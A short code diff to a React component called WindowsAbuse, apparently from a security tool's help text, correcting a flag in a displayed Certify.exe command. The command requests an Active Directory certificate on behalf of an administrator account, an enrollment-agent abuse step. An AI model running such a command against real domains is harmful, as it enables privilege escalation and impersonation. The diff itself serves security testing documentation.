@@ -48,7 +48,7 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <Typography component={'pre'}>
                 {
-                    'Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollment:enrollmentcert.pfx'
+                    'Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollcert:enrollmentcert.pfx'
                 }
             </Typography>
             <Typography variant='body2'>
